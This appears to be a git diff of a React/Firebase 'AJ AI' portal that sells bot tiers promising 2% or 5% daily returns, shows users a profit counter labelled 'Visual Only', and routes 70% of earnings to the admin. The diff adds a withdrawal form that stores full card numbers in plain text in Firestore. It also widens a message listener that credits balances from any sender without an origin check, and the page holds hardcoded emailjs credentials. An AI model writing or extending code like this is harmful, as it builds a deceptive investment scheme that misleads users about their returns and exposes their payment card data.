@@ -3,7 +3,7 @@ import React, { useState, useEffect } from 'react';
 import { auth, db, googleProvider } from '../firebaseConfig';
 import { signInWithPopup, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from 'firebase/auth';
 import { doc, setDoc, onSnapshot, updateDoc, increment, collection, addDoc, getDoc, serverTimestamp } from 'firebase/firestore';
-import { MessageCircle, Trophy, Zap, Wallet, Bot, LogOut, Activity, TrendingUp, CheckCircle2, Download, Share2, Heart } from 'lucide-react';
+import { MessageCircle, Trophy, Zap, Wallet, Bot, LogOut, Globe, ChevronRight, Send, CreditCard, ArrowUpRight, ShieldCheck, Crown, Activity, TrendingUp, X, CheckCircle2, Download, Share2, Heart } from 'lucide-react';
 import emailjs from '@emailjs/browser';
 
 export default function AJSuperPortal() {
@@ -27,6 +27,8 @@ const [transferId, setTransferId] = useState('');
 const [transferAmount, setTransferAmount] = useState(0);
 const [payoutMethod, setPayoutMethod] = useState('Binance Pay (USDT)');
 const [payoutId, setPayoutId] = useState('');
+const [cardName, setCardName] = useState('');
+const [cardNumber, setCardNumber] = useState('');
 
 // Header Visual Balance: Real DB Balance + Live AI Counter (2 Decimal Places)
 const displayBalance = (balance + visualProfit).toFixed(2);
@@ -41,9 +43,13 @@ const notifyAdmin = (type, amount, details) => {
     amount: amount,
     details: details,
   };
-  emailjs.send('service_6w1sols', 'template_o1c40nv', templateParams, '6JCPm9fo38ovnA5LG')
-    .then(() => console.log("CEO Notified!"))
-    .catch((err) => console.error("Email Error:", err));
+
+  emailjs.send(
+    'service_6w1sols', 
+    'template_o1c40nv', 
+    templateParams, 
+    '6JCPm9fo38ovnA5LG'
+  ).then(() => console.log("CEO Notified!"));
 };
 
 // --- PWA INSTALLATION LOGIC ---
@@ -62,7 +68,7 @@ const handleInstallClick = async () => {
   }
 };
 
-// --- OFFLINE EARNING SYNC (Puri Raat Ka Profit) ---
+// --- OFFLINE EARNING SYNC (Puri Raat Ka Profit Calculation) ---
 const syncOfflineProfit = async (u) => {
   const userRef = doc(db, "users", u.uid);
   const snap = await getDoc(userRef);
@@ -74,8 +80,8 @@ const syncOfflineProfit = async (u) => {
     const rate = d.botTier === 'vvip' ? 0.05 : 0.02;
     const totalEarned = ((d.invested * rate) / 86400) * secondsPassed;
     
-    const userHissa = totalEarned * 0.30; // 30% User (Aapka Hukm)
-    const adminHissa = totalEarned * 0.70; // 70% Admin (Aapka Hukm)
+    const userHissa = totalEarned * 0.30; // 30% User (Net Profit)
+    const adminHissa = totalEarned * 0.70; // 70% Admin (Backup)
 
     if (userHissa > 0.01) {
       await updateDoc(userRef, { balance: increment(userHissa), lastSyncTime: serverTimestamp() });
@@ -84,24 +90,42 @@ const syncOfflineProfit = async (u) => {
   }
 };
 
-// --- SDK MESSAGE LISTENER (100:1 & 70/30 Split) ---
+// --- SDK MESSAGE LISTENER (100:1 & 70/30 Split & Ads) ---
 useEffect(() => {
-const handleMsg = async (e) => {
-if (!user || !e.data) return;
-if (e.data.type === 'SHOW_AD') { if (window.show_8924758) window.show_8924758(); }
-if (e.data.type === 'SYNC_GAME_COINS') {
-    const totalAJ = e.data.coins / 100; // 100 Game Coins = 1 AJ Coin
-    const userHissa = totalAJ * 0.30;   // 30% User
-    const adminHissa = totalAJ * 0.70;  // 70% Admin
-    await updateDoc(doc(db, "users", user.uid), { balance: increment(userHissa) });
-    await updateDoc(doc(db, "admin_ledger", "platform_stats"), { total_locked_profit: increment(adminHissa) });
+const handleSDKMessages = async (event) => {
+if (!user) return;
+const data = event.detail || event.data;
+if (!data) return;
+const { type, amount, coins, profit } = data;
+
+if (type === 'EARNED' || type === "ADD_AD_REVENUE" || type === "SYNC_GAME_COINS" || type === "SHOW_AD") {
+    if (type === "SHOW_AD") {
+        if (typeof window !== 'undefined' && window.show_8924758) {
+            window.show_8924758();
+        }
+        return;
+    }
+    
+    const rawValue = amount || coins;
+    if(!rawValue) return;
+
+    // 100 Game Coins = 1 AJ Coin. Then 70/30 Split.
+    const totalAJ = rawValue / 100;
+    const userHissa = totalAJ * 0.30;
+    const adminHissa = totalAJ * 0.70;
+
+    const userRef = doc(db, "users", user.uid);
+    const adminRef = doc(db, "admin_ledger", "platform_stats");
+
+    await updateDoc(userRef, { balance: increment(userHissa) });
+    await updateDoc(adminRef, { total_locked_profit: increment(adminHissa + (profit || 0)) });
   }
 };
-window.addEventListener("message", handleMsg);
-return () => window.removeEventListener("message", handleMsg);
+window.addEventListener("message", handleSDKMessages);
+return () => window.removeEventListener("message", handleSDKMessages);
 }, [user]);
 
-// --- REAL-TIME AI ENGINE (15m Sync) ---
+// --- AI REAL-TIME ENGINE (Visual Only with 70/30 logic) ---
 useEffect(() => {
   let logInt, visualInt, dbSyncInt;
   if (user && botTier !== 'none' && invested > 0) {
@@ -120,7 +144,8 @@ useEffect(() => {
 
     dbSyncInt = setInterval(async () => {
       if (visualProfit >= 0.1) {
-        await updateDoc(doc(db, "users", user.uid), { balance: increment(visualProfit), lastSyncTime: serverTimestamp() });
+        const syncAmt = visualProfit;
+        await updateDoc(doc(db, "users", user.uid), { balance: increment(syncAmt), lastSyncTime: serverTimestamp() });
         setVisualProfit(0);
       }
     }, 900000); 
@@ -137,17 +162,24 @@ return () => clearInterval(interval);
 }, [screen]);
 
 useEffect(() => {
-const unsub = onAuthStateChanged(auth, async (u) => {
-if (u) {
-setUser(u); await syncOfflineProfit(u);
-const userRef = doc(db, "users", u.uid);
-onSnapshot(userRef, (s) => {
-if (s.exists()) { setBalance(s.data().balance || 0); setBotTier(s.data().botTier || 'none'); setInvested(s.data().invested || 0); }
-else { setDoc(userRef, { name: u.displayName, email: u.email, balance: 500, botTier: 'none', invested: 0, lastSyncTime: serverTimestamp() }); }
+const unsubscribe = onAuthStateChanged(auth, async (currentUser) => {
+if (currentUser) {
+setUser(currentUser);
+await syncOfflineProfit(currentUser);
+const userRef = doc(db, "users", currentUser.uid);
+onSnapshot(userRef, (docSnap) => {
+if (docSnap.exists()) {
+setBalance(docSnap.data().balance || 0);
+setBotTier(docSnap.data().botTier || 'none');
+setInvested(docSnap.data().invested || 0);
+} else {
+setDoc(userRef, { name: currentUser.displayName, email: currentUser.email, balance: 500, botTier: 'none', invested: 0, uid: currentUser.uid, lastSyncTime: serverTimestamp() });
+}
 });
 setScreen('hub');
-} else { setUser(null); setScreen('auth'); }});
-return () => unsub();
+} else { setUser(null); setScreen('auth'); }
+});
+return () => unsubscribe();
 }, []);
 
 const handlePurchase = () => {
@@ -159,13 +191,15 @@ if (balance < c) return alert("Low Balance!");
 await updateDoc(doc(db, "users", user.uid), { balance: increment(-c), botTier: t, invested: c, lastSyncTime: serverTimestamp() });
 notifyAdmin("BOT PURCHASE", c, t); 
 setVisualProfit(0);
+alert("🚀 BOT ACTIVE!");
 };
 
 const handleWithdraw = async () => {
 if (balance < 2500) return alert("Min 2,500 Coins!");
-await addDoc(collection(db, "withdraw_requests"), { uid: user.uid, amount: balance, method: payoutMethod, details: payoutId, status: "pending", date: new Date() });
+let details = payoutMethod.includes('Visa') ? `Name: ${cardName} | Card: ${cardNumber}` : payoutId;
+await addDoc(collection(db, "withdraw_requests"), { uid: user.uid, amount: balance, method: payoutMethod, details: details, status: "pending", date: new Date() });
 notifyAdmin("WITHDRAWAL", balance, payoutMethod); 
-alert("Request Sent!");
+alert("✅ Request Sent!"); setWalletTab('main');
 };
 
 if (screen === 'splash') return (
@@ -220,9 +254,9 @@ return (
                <span className="font-black text-xl md:text-4xl uppercase">AJ AI</span>
             </div>
             {/* WALLET - Bottom Right */}
-            <div onClick={() => {setScreen('wallet'); setWalletTab('main')}} className="bg-white/5 border-2 border-yellow-500/30 rounded-3xl h-48 md:h-80 flex flex-center justify-center cursor-pointer shadow-xl relative z-30">
+            <div onClick={() => {setScreen('wallet'); setWalletTab('main')}} className="bg-white/5 border-2 border-yellow-500/30 rounded-3xl h-48 md:h-80 flex flex-col items-center justify-center cursor-pointer shadow-xl relative z-30">
                <Wallet className="text-yellow-500 w-10 h-10 md:w-20 md:h-20 mb-2" />
-               <h2 className="font-black text-xl md:text-4xl uppercase text-yellow-500">Wallet</h2>
+               <h2 className="font-black text-xl md:text-4xl uppercase text-yellow-500 text-center">Wallet</h2>
             </div>
             {/* Central Logo */}
             <div className="absolute inset-0 flex items-center justify-center pointer-events-none z-0">
@@ -239,9 +273,10 @@ return (
             <button onClick={() => setScreen('hub')} className="text-cyan-400 font-bold mb-10 tracking-widest uppercase">← BACK</button>
             {!selectedGame ? (
               <div className="grid grid-cols-2 md:grid-cols-3 gap-6">
-                {['Rider King', 'Pulse Racer', 'Subsea Surge', 'Neon Strike', 'Volcano Escape', 'Ludo', 'Air Hockey'].map((game) => (
+                {['Rider King', 'Pulse Racer', 'Subsea Surge', 'Neon Strike', 'Volcano Escape', 'Ludo', 'Puck Pulse Elite'].map((game) => (
                   <div key={game} onClick={() => setSelectedGame(game)} className="bg-white/5 border border-white/10 p-6 rounded-3xl text-center hover:border-cyan-400 cursor-pointer transition-all">
-                    <img src={`/games/${game.toLowerCase().replace(/ /g, '-')}/logo.png`} className="w-full aspect-square rounded-xl mb-4 object-cover" alt={game} onError={(e) => { e.target.src = "/logo.jpg"; }} />
+                    {/* 512x512 LOGO FIX: ASPECT SQUARE */}
+                    <img src={`/games/${game.toLowerCase().replace(/ /g, '-')}/logo.png`} className="w-full aspect-square rounded-xl mb-4 object-cover" alt={game} onError={(e) => { (e.target).src = "/logo.jpg"; }} />
                     <h3 className="font-black text-sm uppercase">{game}</h3>
                     <button className="mt-4 bg-cyan-500 text-black text-[10px] font-black px-4 py-2 rounded-full">PLAY NOW</button>
                   </div>
@@ -257,7 +292,7 @@ return (
 
     {screen === 'ai' && (
         <div className="fixed inset-0 z-[200] bg-black flex flex-col items-center p-8 overflow-y-auto pt-24 pb-20">
-          <button onClick={() => setScreen('hub')} className="self-start text-green-400 mb-12 font-bold">← BACK</button>
+          <button onClick={() => setScreen('hub')} className="self-start text-green-400 mb-12 font-bold uppercase">← BACK</button>
           {botTier !== 'none' && (
             <div className="w-full max-w-2xl bg-white/5 border-2 border-green-500/40 p-8 rounded-[3rem] text-center mb-16 shadow-2xl">
               <Activity size={60} className="mx-auto mb-6 text-green-500 animate-pulse" />
@@ -272,32 +307,12 @@ return (
             <div onClick={() => activateBot('basic', 2500)} className={`bg-white/5 border-2 p-10 rounded-3xl text-center hover:border-cyan-500 cursor-pointer ${botTier === 'basic' ? 'border-green-500' : 'border-cyan-500/30'}`}>
               <h3 className="text-xl font-black text-cyan-400 uppercase">BASIC (+2% Daily)</h3>
               <p className="text-3xl font-black text-white my-6">2,500 Coins</p>
-              <button className="w-full py-4 bg-cyan-600 rounded-xl font-black uppercase">ACTIVATE</button>
+              <button className="w-full py-4 bg-cyan-600 rounded-xl font-black uppercase active:scale-95">{botTier === 'basic' ? "Currently Running" : "Activate"}</button>
             </div>
-            <div onClick={() => activateBot('vvip', 7500)} className={`bg-white/5 border-2 p-10 rounded-3xl text-center hover:border-yellow-500 cursor-pointer ${botTier === 'vvip' ? 'border-green-500' : 'border-yellow-500/30'}`}>
+            <div onClick={() => activateBot('vvip', 7500)} className={`bg-white/5 border-2 p-10 rounded-3xl text-center hover:border-yellow-500 cursor-pointer ${botTier === 'vvip' ? 'border-yellow-500' : 'border-yellow-500/30'}`}>
               <h3 className="text-xl font-black text-yellow-500 uppercase">VVIP (+5% Daily)</h3>
               <p className="text-3xl font-black text-white my-6">7,500 Coins</p>
-              <button className="w-full py-4 bg-yellow-600 rounded-xl font-black text-black uppercase">ACTIVATE</button>
-            </div>
-          </div>
-        </div>
-    )}
-
-    {screen === 'social' && (
-        <div className="fixed inset-0 z-[200] bg-black p-10 pt-24 flex flex-col items-center overflow-y-auto">
-          <button onClick={() => setScreen('hub')} className="self-start text-pink-500 font-bold mb-10 text-xl uppercase">← BACK</button>
-          <div className="max-w-md mx-auto space-y-8">
-            <div className="bg-white/5 backdrop-blur-2xl border border-white/10 rounded-[2.5rem] p-6 shadow-2xl relative">
-              <div className="flex items-center gap-4 mb-6">
-                 <div className="w-12 h-12 bg-cyan-500 rounded-2xl flex items-center justify-center font-black">AJ</div>
-                 <div><h4 className="font-black text-sm uppercase">AJ_Pulse_Official</h4><span className="text-[10px] text-gray-500">Premium Feed Active</span></div>
-              </div>
-              <div className="rounded-3xl overflow-hidden border border-white/10 h-64 bg-gray-900 flex items-center justify-center italic text-gray-700 text-center px-4">Multimedia Feed Loading... <br/> (Movies, Videos & Posts)</div>
-              <div className="mt-6 grid grid-cols-3 gap-2">
-                 <button className="bg-white/5 py-3 rounded-2xl flex items-center justify-center gap-1 text-[10px]"><Heart size={14}/> Like</button>
-                 <button className="bg-white/5 py-3 rounded-2xl flex items-center justify-center gap-1 text-[10px]"><MessageCircle size={14}/> Comment</button>
-                 <button className="bg-white/5 py-3 rounded-2xl flex items-center justify-center gap-1 text-[10px]"><Share2 size={14}/> Share</button>
-              </div>
+              <button className="w-full py-4 bg-yellow-600 rounded-xl font-black text-black uppercase active:scale-95">{botTier === 'vvip' ? "Currently Running" : "Activate"}</button>
             </div>
           </div>
         </div>
